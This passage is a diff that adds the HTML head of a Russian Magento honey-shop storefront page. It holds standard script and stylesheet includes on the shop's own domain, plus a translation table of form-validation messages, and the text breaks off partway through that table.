@@ -1,0 +1,483 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="ru" lang="ru">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Медовый мир</title>
+<meta name="description" content="" />
+<meta name="keywords" content="" />
+<meta name="robots" content="INDEX,FOLLOW" />
+<link rel="icon" href="http://medovmir.ru/media/favicon/default/favicon.ico" type="image/x-icon" />
+<link rel="shortcut icon" href="http://medovmir.ru/media/favicon/default/favicon.ico" type="image/x-icon" />
+<!--[if lt IE 7]>
+<script type="text/javascript">
+//<![CDATA[
+    var BLANK_URL = 'http://medovmir.ru/js/blank.html';
+    var BLANK_IMG = 'http://medovmir.ru/js/spacer.gif';
+//]]>
+</script>
+<![endif]-->
+<link rel="stylesheet" type="text/css" href="http://medovmir.ru/skin/frontend/default/honey/css/styles.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://medovmir.ru/skin/frontend/default/honey/css/honey.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://medovmir.ru/skin/frontend/base/default/css/widgets.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://medovmir.ru/skin/frontend/default/default/css/print.css" media="print" />
+<script type="text/javascript" src="http://medovmir.ru/js/prototype/prototype.js"></script>
+<script type="text/javascript" src="http://medovmir.ru/js/lib/ccard.js"></script>
+<script type="text/javascript" src="http://medovmir.ru/js/prototype/validation.js"></script>
+<script type="text/javascript" src="http://medovmir.ru/js/scriptaculous/builder.js"></script>
+<script type="text/javascript" src="http://medovmir.ru/js/scriptaculous/effects.js"></script>
+<script type="text/javascript" src="http://medovmir.ru/js/scriptaculous/dragdrop.js"></script>
+<script type="text/javascript" src="http://medovmir.ru/js/scriptaculous/controls.js"></script>
+<script type="text/javascript" src="http://medovmir.ru/js/scriptaculous/slider.js"></script>
+<script type="text/javascript" src="http://medovmir.ru/js/varien/js.js"></script>
+<script type="text/javascript" src="http://medovmir.ru/js/varien/form.js"></script>
+<script type="text/javascript" src="http://medovmir.ru/js/varien/menu.js"></script>
+<script type="text/javascript" src="http://medovmir.ru/js/mage/translate.js"></script>
+<script type="text/javascript" src="http://medovmir.ru/js/mage/cookies.js"></script>
+<!--[if lt IE 8]>
+<link rel="stylesheet" type="text/css" href="http://medovmir.ru/skin/frontend/default/default/css/styles-ie.css" media="all" />
+<![endif]-->
+<!--[if lt IE 7]>
+<script type="text/javascript" src="http://medovmir.ru/js/lib/ds-sleight.js"></script>
+<script type="text/javascript" src="http://medovmir.ru/skin/frontend/base/default/js/ie6.js"></script>
+<![endif]-->
+
+<script type="text/javascript">
+//<![CDATA[
+Mage.Cookies.path     = '/';
+Mage.Cookies.domain   = '.medovmir.ru';
+//]]>
+</script>
+
+<script type="text/javascript">
+//<![CDATA[
+optionalZipCountries = [];
+//]]>
+</script>
+<script type="text/javascript">var Translator = new Translate({"Please select an option.":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0432\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043e\u0434\u0438\u043d \u0432\u0430\u0440\u0438\u0430\u043d\u0442.","This is a required field.":"\u042d\u0442\u043e \u043f\u043e\u043b\u0435 \u043e\u0431\u044f\u0437\u0430\u0442\u0435\u043b\u044c\u043d\u043e \u0434\u043b\u044f \u0437\u0430\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u044f.","Please enter a valid number in this field.":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0432\u0432\u0435\u0434\u0438\u0442\u0435 \u0432 \u044d\u0442\u043e \u043f\u043e\u043b\u0435 \u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u043e\u0435 \u0447\u0438\u0441\u043b\u043e.","Please use numbers only in this field. Please avoid spaces or other characters such as dots or commas.":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0439\u0442\u0435 \u0432 \u044d\u0442\u043e\u043c \u043f\u043e\u043b\u0435 \u0442\u043e\u043b\u044c\u043a\u043e \u0446\u0438\u0444\u0440\u044b. \u0418\u0437\u0431\u0435\u0433\u0430\u0439\u0442\u0435 \u043f\u0440\u043e\u0431\u0435\u043b\u043e\u0432 \u0438\u043b\u0438 \u0434\u0440\u0443\u0433\u0438\u0445 \u0441\u0438\u043c\u0432\u043e\u043b\u043e\u0432, \u043d\u0430\u043f\u043e\u0434\u043e\u0431\u0438\u0435 \u0442\u043e\u0447\u0435\u043a \u0438 \u0437\u0430\u043f\u044f\u0442\u044b\u0445.","Please use letters only (a-z) in this field.":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0439\u0442\u0435 \u0432 \u044d\u0442\u043e\u043c \u043f\u043e\u043b\u0435 \u0442\u043e\u043b\u044c\u043a\u043e \u0431\u0443\u043a\u0432\u044b (a-z).","Please use only letters (a-z), numbers (0-9) or underscore(_) in this field, first character should be a letter.":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0439\u0442\u0435 \u0432 \u044d\u0442\u043e\u043c \u043f\u043e\u043b\u0435 \u0442\u043e\u043b\u044c\u043a\u043e \u0431\u0443\u043a\u0432\u044b (a-z), \u0446\u0438\u0444\u0440\u044b (0-9) \u0438\u043b\u0438 \u043f\u043e\u0434\u0447\u0451\u0440\u043a\u0438\u0432\u0430\u043d\u0438\u044f(_). \u041f\u0435\u0440\u0432\u044b\u0439 \u0441\u0438\u043c\u0432\u043e\u043b \u0434\u043e\u043b\u0436\u0435\u043d \u0431\u044b\u0442\u044c \u0431\u0443\u043a\u0432\u043e\u0439.","Please use only letters (a-z) or numbers (0-9) only in this field. No spaces or other characters are allowed.":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0439\u0442\u0435 \u0432 \u044d\u0442\u043e\u043c \u043f\u043e\u043b\u0435 \u0442\u043e\u043b\u044c\u043a\u043e \u0431\u0443\u043a\u0432\u044b (a-z) \u0438\u043b\u0438 \u0446\u0438\u0444\u0440\u044b (0-9). \u041f\u0440\u043e\u0431\u0435\u043b\u044b \u0438 \u0434\u0440\u0443\u0433\u0438\u0435 \u0441\u0438\u043c\u0432\u043e\u043b\u044b \u0437\u0430\u043f\u0440\u0435\u0449\u0435\u043d\u044b.","Please use only letters (a-z) or numbers (0-9) or spaces and # only in this field.":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0439\u0442\u0435 \u0432 \u044d\u0442\u043e\u043c \u043f\u043e\u043b\u0435 \u0442\u043e\u043b\u044c\u043a\u043e \u0431\u0443\u043a\u0432\u044b (a-z), \u0446\u0438\u0444\u0440\u044b (0-9), \u043f\u0440\u043e\u0431\u0435\u043b\u044b \u0438\u043b\u0438 #.","Please enter a valid phone number. For example (123) 456-7890 or 123-456-7890.":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0432\u0432\u0435\u0434\u0438\u0442\u0435 \u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u044b\u0439 \u0442\u0435\u043b\u0435\u0444\u043e\u043d\u043d\u044b\u0439 \u043d\u043e\u043c\u0435\u0440. \u041d\u0430\u043f\u0440\u0438\u043c\u0435\u0440, (123) 456-7890 \u0438\u043b\u0438 123-456-7890.","Please enter a valid date.":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0432\u0432\u0435\u0434\u0438\u0442\u0435 \u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u0443\u044e \u0434\u0430\u0442\u0443.","Please enter a valid email address. For example johndoe@domain.com.":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0432\u0432\u0435\u0434\u0438\u0442\u0435 \u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u044b\u0439 \u0430\u0434\u0440\u0435\u0441 \u044d\u043b\u0435\u043a\u0442\u0440\u043e\u043d\u043d\u043e\u0439 \u043f\u043e\u0447\u0442\u044b (email). \u041d\u0430\u043f\u0440\u0438\u043c\u0435\u0440, ivanivanov@domain.com.","Please enter 6 or more characters.":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0432\u0432\u0435\u0434\u0438\u0442\u0435 6 \u0438\u043b\u0438 \u0431\u043e\u043b\u0435\u0435 \u0441\u0438\u043c\u0432\u043e\u043b\u043e\u0432.","Please make sure your passwords match.":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430 \u0443\u0431\u0435\u0434\u0438\u0442\u0435\u0441\u044c, \u0447\u0442\u043e \u0432\u0430\u0448\u0438 \u043f\u0430\u0440\u043e\u043b\u0438 \u0441\u043e\u0432\u043f\u0430\u0434\u0430\u044e\u0442.","Please enter a valid URL. Protocol is required (http:\/\/, https:\/\/ or ftp:\/\/)":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0432\u0432\u0435\u0434\u0438\u0442\u0435 \u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u044b\u0439 \u0430\u0434\u0440\u0435\u0441. \u041d\u0435 \u0437\u0430\u0431\u0443\u0434\u044c\u0442\u0435 \u0443\u043a\u0430\u0437\u0430\u0442\u044c \u043f\u0440\u043e\u0442\u043e\u043a\u043e\u043b (http:\/\/, https:\/\/ \u0438\u043b\u0438 ftp:\/\/)","Please enter a valid URL. For example http:\/\/www.example.com or www.example.com":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0432\u0432\u0435\u0434\u0438\u0442\u0435 \u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u044b\u0439 \u0430\u0434\u0440\u0435\u0441. \u041d\u0430\u043f\u0440\u0438\u043c\u0435\u0440, http:\/\/www.example.com \u0438\u043b\u0438 www.example.com","Please enter a valid social security number. For example 123-45-6789.":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0432\u0432\u0435\u0434\u0438\u0442\u0435 \u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u044b\u0439 \u043d\u043e\u043c\u0435\u0440 \u0441\u043e\u0446\u0438\u0430\u043b\u044c\u043d\u043e\u0433\u043e \u0441\u0442\u0440\u0430\u0445\u043e\u0432\u0430\u043d\u0438\u044f. \u041d\u0430\u043f\u0440\u0438\u043c\u0435\u0440, 123-45-6789.","Please enter a valid zip code. For example 90602 or 90602-1234.":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0432\u0432\u0435\u0434\u0438\u0442\u0435 \u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u044b\u0439 \u043f\u043e\u0447\u0442\u043e\u0432\u044b\u0439 \u0438\u043d\u0434\u0435\u043a\u0441. \u041d\u0430\u043f\u0440\u0438\u043c\u0435\u0440, 9060 \u0438\u043b\u0438 90602-1234.","Please enter a valid zip code.":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0432\u0432\u0435\u0434\u0438\u0442\u0435 \u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u044b\u0439 \u043f\u043e\u0447\u0442\u043e\u0432\u044b\u0439 \u0438\u043d\u0434\u0435\u043a\u0441.","Please use this date format: dd\/mm\/yyyy. For example 17\/03\/2006 for the 17th of March, 2006.":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0439\u0442\u0435 \u0434\u043b\u044f \u0434\u0430\u0442\u044b \u0444\u043e\u0440\u043c\u0430\u0442: dd\/mm\/yyyy. \u041d\u0430\u043f\u0440\u0438\u043c\u0435\u0440, 17\/03\/2006 \u0434\u043b\u044f 17-\u0433\u043e \u043c\u0430\u0440\u0442\u0430 2006 \u0433\u043e\u0434\u0430.","Please enter a valid $ amount. For example $100.00.":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0432\u0432\u0435\u0434\u0438\u0442\u0435 \u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u0443\u044e \u0434\u0435\u043d\u0435\u0436\u043d\u0443\u044e \u0432\u0435\u043b\u0438\u0447\u0438\u043d\u0443. \u041d\u0430\u043f\u0440\u0438\u043c\u0435\u0440, $100.00.","Please select one of the above options.":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0432\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043e\u0434\u0438\u043d \u0438\u0437 \u0432\u044b\u0448\u0435\u0443\u043a\u0430\u0437\u0430\u043d\u043d\u044b\u0445 \u0432\u0430\u0440\u0438\u0430\u043d\u0442\u043e\u0432.","Please select one of the options.":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0432\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043e\u0434\u0438\u043d \u0438\u0437 \u0432\u0430\u0440\u0438\u0430\u043d\u0442\u043e\u0432.","Please select State\/Province.":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0432\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u0448\u0442\u0430\u0442\/\u043f\u0440\u043e\u0432\u0438\u043d\u0446\u0438\u044e.","Please enter valid password.":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0432\u0432\u0435\u0434\u0438\u0442\u0435 \u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u044b\u0439 \u043f\u0430\u0440\u043e\u043b\u044c.","Please enter 6 or more characters. Leading or trailing spaces will be ignored.":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0432\u0432\u0435\u0434\u0438\u0442\u0435 6 \u0438\u043b\u0438 \u0431\u043e\u043b\u0435\u0435 \u0441\u0438\u043c\u0432\u043e\u043b\u043e\u0432. \u041f\u0440\u043e\u0431\u0435\u043b\u044b \u043f\u0435\u0440\u0435\u0434 \u0438 \u043f\u043e\u0441\u043b\u0435 \u0441\u0438\u043c\u0432\u043e\u043b\u043e\u0432 \u0431\u0443\u0434\u0443\u0442 \u043f\u0440\u043e\u0438\u0433\u043d\u043e\u0440\u0438\u0440\u043e\u0432\u0430\u043d\u044b.","Please use letters only (a-z or A-Z) in this field.":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0439\u0442\u0435 \u0432 \u044d\u0442\u043e\u043c \u043f\u043e\u043b\u0435 \u0442\u043e\u043b\u044c\u043a\u043e \u0431\u0443\u043a\u0432\u044b (a-z \u0438\u043b\u0438 A-Z).","Please enter a number greater than 0 in this field.":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0432\u0432\u0435\u0434\u0438\u0442\u0435 \u0432 \u044d\u0442\u043e \u043f\u043e\u043b\u0435 \u0447\u0438\u0441\u043b\u043e \u0431\u043e\u043b\u044c\u0448\u0435 0.","Please enter a valid credit card number.":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0432\u0432\u0435\u0434\u0438\u0442\u0435 \u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u044b\u0439 \u043d\u043e\u043c\u0435\u0440 \u043a\u0440\u0435\u0434\u0438\u0442\u043d\u043e\u0439 \u043a\u0430\u0440\u0442\u044b.","Please wait, loading...":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u043f\u043e\u0434\u043e\u0436\u0434\u0438\u0442\u0435, \u0438\u0434\u0435\u0442 \u0437\u0430\u0433\u0440\u0443\u0437\u043a\u0430...","Please choose to register or to checkout as a guest":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0441\u0434\u0435\u043b\u0430\u0439\u0442\u0435 \u0432\u044b\u0431\u043e\u0440: \u0437\u0430\u0440\u0435\u0433\u0438\u0441\u0442\u0440\u0438\u0440\u043e\u0432\u0430\u0442\u044c\u0441\u044f \u0438\u043b\u0438 \u043e\u0444\u043e\u0440\u043c\u0438\u0442\u044c \u0437\u0430\u043a\u0430\u0437 \u0431\u0435\u0437 \u0440\u0435\u0433\u0438\u0441\u0442\u0440\u0430\u0446\u0438\u0438 \u043d\u0430 \u0441\u0430\u0439\u0442\u0435","Error: Passwords do not match":"\u041e\u0448\u0438\u0431\u043a\u0430: \u041f\u0430\u0440\u043e\u043b\u0438 \u043d\u0435 \u0441\u043e\u0432\u043f\u0430\u0434\u0430\u044e\u0442","Your order cannot be completed at this time as there is no shipping methods available for it. Please make necessary changes in your shipping address.":"\u0412\u0430\u0448 \u0437\u0430\u043a\u0430\u0437 \u043d\u0435 \u043c\u043e\u0436\u0435\u0442 \u0431\u044b\u0442\u044c \u0437\u0430\u0432\u0435\u0440\u0448\u0451\u043d \u0432 \u0434\u0430\u043d\u043d\u044b\u0439 \u043c\u043e\u043c\u0435\u043d\u0442, \u043f\u043e\u0441\u043a\u043e\u043b\u044c\u043a\u0443 \u0434\u043b\u044f \u043d\u0435\u0433\u043e \u043d\u0435\u0442 \u0434\u043e\u0441\u0442\u0443\u043f\u043d\u044b\u0445 \u043c\u0435\u0442\u043e\u0434\u043e\u0432 \u0434\u043e\u0441\u0442\u0430\u0432\u043a\u0438. \u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0432\u043d\u0435\u0441\u0438\u0442\u0435 \u043d\u0435\u043e\u0431\u0445\u043e\u0434\u0438\u043c\u044b\u0435 \u0438\u0437\u043c\u0435\u043d\u0435\u043d\u0438\u044f \u0432 \u0430\u0434\u0440\u0435\u0441 \u0434\u043e\u0441\u0442\u0430\u0432\u043a\u0438.","Please specify shipping method.":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0443\u043a\u0430\u0436\u0438\u0442\u0435 \u043c\u0435\u0442\u043e\u0434 \u0434\u043e\u0441\u0442\u0430\u0432\u043a\u0438.","Your order cannot be completed at this time as there is no payment methods available for it.":"\u0412\u0430\u0448 \u0437\u0430\u043a\u0430\u0437 \u043d\u0435 \u043c\u043e\u0436\u0435\u0442 \u0431\u044b\u0442\u044c \u0437\u0430\u0432\u0435\u0440\u0448\u0451\u043d \u0432 \u0434\u0430\u043d\u043d\u044b\u0439 \u043c\u043e\u043c\u0435\u043d\u0442, \u043f\u043e\u0441\u043a\u043e\u043b\u044c\u043a\u0443 \u0434\u043b\u044f \u043d\u0435\u0433\u043e \u043d\u0435\u0442 \u0434\u043e\u0441\u0442\u0443\u043f\u043d\u044b\u0445 \u043c\u0435\u0442\u043e\u0434\u043e\u0432 \u043e\u043f\u043b\u0430\u0442\u044b.","Please specify payment method.":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0443\u043a\u0430\u0436\u0438\u0442\u0435 \u043c\u0435\u0442\u043e\u0434 \u043e\u043f\u043b\u0430\u0442\u044b.","Credit card number does not match credit card type.":"\u041d\u043e\u043c\u0435\u0440 \u043a\u0440\u0435\u0434\u0438\u0442\u043d\u043e\u0439 \u043a\u0430\u0440\u0442\u044b \u043d\u0435 \u0441\u043e\u0432\u043f\u0430\u0434\u0430\u0435\u0442 \u0441 \u0442\u0438\u043f\u043e\u043c \u043a\u0430\u0440\u0442\u044b","Card type does not match credit card number.":"\u0422\u0438\u043f \u043a\u0430\u0440\u0442\u044b \u043d\u0435 \u0441\u043e\u0432\u043f\u0430\u0434\u0430\u0435\u0442 \u0441 \u043d\u043e\u043c\u0435\u0440\u043e\u043c \u043a\u0440\u0435\u0434\u0438\u0442\u043d\u043e\u0439 \u043a\u0430\u0440\u0442\u044b.","Please enter a valid credit card verification number.":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0432\u0432\u0435\u0434\u0438\u0442\u0435 \u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u044b\u0439 \u043f\u0440\u043e\u0432\u0435\u0440\u043e\u0447\u043d\u044b\u0439 \u043d\u043e\u043c\u0435\u0440 \u043a\u0440\u0435\u0434\u0438\u0442\u043d\u043e\u0439 \u043a\u0430\u0440\u0442\u044b.","Please use only letters (a-z or A-Z), numbers (0-9) or underscore(_) in this field, first character should be a letter.":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0439\u0442\u0435 \u0432 \u044d\u0442\u043e\u043c \u043f\u043e\u043b\u0435 \u0442\u043e\u043b\u044c\u043a\u043e \u0431\u0443\u043a\u0432\u044b (a-z or A-Z), \u0446\u0438\u0444\u0440\u044b (0-9) \u0438\u043b\u0438 \u043f\u043e\u0434\u0447\u0451\u0440\u043a\u0438\u0432\u0430\u043d\u0438\u044f (_). \u041f\u0435\u0440\u0432\u044b\u0439 \u0441\u0438\u043c\u0432\u043e\u043b \u0434\u043e\u043b\u0436\u0435\u043d \u0431\u044b\u0442\u044c \u0431\u0443\u043a\u0432\u043e\u0439.","Please input a valid CSS-length. For example 100px or 77pt or 20em or .5ex or 50%.":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0432\u0432\u0435\u0434\u0438\u0442\u0435 \u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u0443\u044e CSS - \u0434\u043b\u0438\u043d\u0443. \u041d\u0430\u043f\u0440\u0438\u043c\u0435\u0440, 100px \u0438\u043b\u0438 77pt \u0438\u043b\u0438 20em \u0438\u043b\u0438 .5ex \u0438\u043b\u0438 50%.","Maximum length exceeded.":"\u041f\u0440\u0435\u0432\u044b\u0448\u0435\u043d\u0430 \u043c\u0430\u043a\u0441\u0438\u043c\u0430\u043b\u044c\u043d\u0430\u044f \u0434\u043b\u0438\u043d\u043d\u0430.","Your session has been expired, you will be relogged in now.":"\u0421\u0440\u043e\u043a \u0432\u0430\u0448\u0435\u0433\u043e \u0441\u0435\u0430\u043d\u0441\u0430 \u0438\u0441\u0442\u0451\u043a. \u0412\u044b \u0431\u0443\u0434\u0435\u0442\u0435 \u043f\u0435\u0440\u0435\u043d\u0430\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u044b \u043d\u0430 \u0444\u043e\u0440\u043c\u0443 \u0430\u0432\u0442\u043e\u0440\u0438\u0437\u0430\u0446\u0438\u0438.","Incorrect credit card expiration date.":"\u041d\u0435\u0432\u0435\u0440\u043d\u0430\u044f \u0434\u0430\u0442\u0430 \u0438\u0441\u0442\u0435\u0447\u0435\u043d\u0438\u044f \u0441\u0440\u043e\u043a\u0430 \u0434\u0435\u0439\u0441\u0442\u0432\u0438\u044f \u0440\u0430\u0441\u0447\u0451\u0442\u043d\u043e\u0439 \u043a\u0430\u0440\u0442\u044b","This date is a required value.":"\u042d\u0442\u0430 \u0434\u0430\u0442\u0430 - \u043e\u0431\u044f\u0437\u0430\u0442\u0435\u043b\u044c\u043d\u043e\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435.","The value is not within the specified range.":"\u0417\u043d\u0430\u0447\u0435\u043d\u0438\u0435 \u043d\u0435 \u0432\u0445\u043e\u0434\u0438\u0442 \u0432 \u0443\u043a\u0430\u0437\u0430\u043d\u043d\u044b\u0439 \u0434\u0438\u0430\u043f\u0430\u0437\u043e\u043d.","Please use only letters (a-z or A-Z) or numbers (0-9) only in this field. No spaces or other characters are allowed.":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0439\u0442\u0435 \u0432 \u044d\u0442\u043e\u043c \u043f\u043e\u043b\u0435 \u0442\u043e\u043b\u044c\u043a\u043e \u0431\u0443\u043a\u0432\u044b (a-z \u0438\u043b\u0438 A-Z) \u0438\u043b\u0438 \u0446\u0438\u0444\u0440\u044b (0-9). \u041f\u0440\u043e\u0431\u0435\u043b\u044b \u0438 \u0434\u0440\u0443\u0433\u0438\u0435 \u0441\u0438\u043c\u0432\u043e\u043b\u044b \u0437\u0430\u043f\u0440\u0435\u0449\u0435\u043d\u044b.","Please use only letters (a-z or A-Z) or numbers (0-9) or spaces and # only in this field.":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0439\u0442\u0435 \u0432 \u044d\u0442\u043e\u043c \u043f\u043e\u043b\u0435 \u0442\u043e\u043b\u044c\u043a\u043e \u0431\u0443\u043a\u0432\u044b (a-z \u0438\u043b\u0438 A-Z), \u0446\u0438\u0444\u0440\u044b (0-9), \u043f\u0440\u043e\u0431\u0435\u043b\u044b \u0438\u043b\u0438 #.","Please enter a valid fax number. For example (123) 456-7890 or 123-456-7890.":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0432\u0432\u0435\u0434\u0438\u0442\u0435 \u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u044b\u0439 \u043d\u043e\u043c\u0435\u0440 \u0444\u0430\u043a\u0441\u0430. \u041d\u0430\u043f\u0440\u0438\u043c\u0435\u0440, (123) 456-7890 \u0438\u043b\u0438 123-456-7890.","Please use only visible characters and spaces.":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0439\u0442\u0435 \u0442\u043e\u043b\u044c\u043a\u043e \u0432\u0438\u0434\u0438\u043c\u044b\u0435 \u0441\u0438\u043c\u0432\u043e\u043b\u044b \u0438 \u043f\u0440\u043e\u0431\u0435\u043b\u044b.","Please enter 7 or more characters. Password should contain both numeric and alphabetic characters.":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0432\u0432\u0435\u0434\u0438\u0442\u0435 6 \u0438\u043b\u0438 \u0431\u043e\u043b\u0435\u0435 \u0441\u0438\u043c\u0432\u043e\u043b\u043e\u0432. \u041f\u0430\u0440\u043e\u043b\u044c \u0434\u043e\u043b\u0436\u0435\u043d \u0441\u043e\u0434\u0435\u0440\u0436\u0430\u0442\u044c \u043a\u0430\u043a \u0431\u0443\u043a\u0432\u044b, \u0442\u0430\u043a \u0438 \u0446\u0438\u0444\u0440\u044b.","Please enter a valid URL Key. For example \"example-page\", \"example-page.html\" or \"anotherlevel\/example-page\".":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0432\u0432\u0435\u0434\u0438\u0442\u0435 \u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u044b URL Key. \u041d\u0430\u043f\u0440\u0438\u043c\u0435\u0440, \"example-page\", \"example-page.html\" \u0438\u043b\u0438 \"anotherlevel\/example-page\".","Please enter a valid XML-identifier. For example something_1, block5, id-4.":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0432\u0432\u0435\u0434\u0438\u0442\u0435 \u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u044b\u0439 XML-\u0438\u0434\u0435\u043d\u0442\u0438\u0444\u0438\u043a\u0430\u0442\u043e\u0440. \u041d\u0430\u043f\u0440\u0438\u043c\u0435\u0440, something_1, block5, id-4.","Please enter a number 0 or greater in this field.":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0432\u0432\u0435\u0434\u0438\u0442\u0435 \u0432 \u044d\u0442\u043e \u043f\u043e\u043b\u0435 \u0447\u0438\u0441\u043b\u043e \u0431\u043e\u043b\u044c\u0448\u0435 0 \u0438\u043b\u0438 0.","Text length does not satisfy specified text range.":"\u0414\u043b\u0438\u043d\u043d\u0430 \u0442\u0435\u043a\u0441\u0442\u0430 \u043d\u0435 \u0443\u0434\u043e\u0432\u043b\u0435\u0442\u0432\u043e\u0440\u044f\u0435\u0442 \u0443\u043a\u0430\u0437\u0430\u043d\u043d\u043e\u043c\u0443 \u0434\u0438\u0430\u043f\u0430\u0437\u043e\u043d\u0443 \u0442\u0435\u043a\u0441\u0442\u0430.","Please enter a number lower than 100.":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0432\u0432\u0435\u0434\u0438\u0442\u0435 \u0447\u0438\u0441\u043b\u043e \u043c\u0435\u043d\u044c\u0448\u0435 100.","Please enter issue number or start date for switch\/solo card type.":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0432\u0432\u0435\u0434\u0438\u0442\u0435 \u043d\u043e\u043c\u0435\u0440 \u0432\u043e\u043f\u0440\u043e\u0441\u0430 \u0438\u043b\u0438 \u0434\u0430\u0442\u0443 \u043d\u0430\u0447\u0430\u043b\u0430 \u0434\u043b\u044f \u0442\u0438\u043f\u0430 \u043a\u0430\u0440\u0442\u044b switch\/solo.","Please enter a valid day (1-%d).":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0432\u0432\u0435\u0434\u0438\u0442\u0435 \u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u044b\u0439 \u0434\u0435\u043d\u044c 